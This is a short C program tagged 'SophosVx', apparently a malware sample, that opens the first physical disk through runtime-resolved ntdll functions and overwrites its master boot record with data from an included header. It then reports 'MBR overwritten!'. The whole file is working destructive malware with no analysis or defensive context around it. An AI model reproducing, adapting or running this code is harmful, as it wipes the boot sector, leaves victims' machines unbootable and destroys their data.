//SophosVx
#include <Windows.h>
#include <stdio.h>

#include "Headers/typedefs.h"
#include "Headers/mbr.h"

int main() {
    HANDLE hDevice;
    OBJECT_ATTRIBUTES objAttrs;
    IO_STATUS_BLOCK ioStatus = { 0 };
    UNICODE_STRING deviceName;
    NTSTATUS status;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

    RtlInitUnicodeString_t pRtlInitUnicodeString = (RtlInitUnicodeString_t)GetProcAddress(hNtdll, "RtlInitUnicodeString");
    NtCreateFile_t pNtCreateFile = (NtCreateFile_t)GetProcAddress(hNtdll, "NtCreateFile");
    NtWriteFile_t pNtWriteFile = (NtWriteFile_t)GetProcAddress(hNtdll, "NtWriteFile");

    pRtlInitUnicodeString(&deviceName, L"\\??\\PhysicalDrive0");
    InitializeObjectAttributes(&objAttrs, &deviceName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = pNtCreateFile(&hDevice, GENERIC_WRITE | SYNCHRONIZE, &objAttrs, &ioStatus, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, 0, NULL, 0);
    if (!NT_SUCCESS(status)) {
        return 1;
    }

    LARGE_INTEGER byteOffset = { 0 };
    status = pNtWriteFile(hDevice, NULL, NULL, NULL, &ioStatus, mbr_data, sizeof(mbr_data), &byteOffset, NULL);
    if (!NT_SUCCESS(status)) {
        CloseHandle(hDevice);
        return 1;
    }

    CloseHandle(hDevice);
    printf("[+] MBR overwritten!\n");
    return 0;
}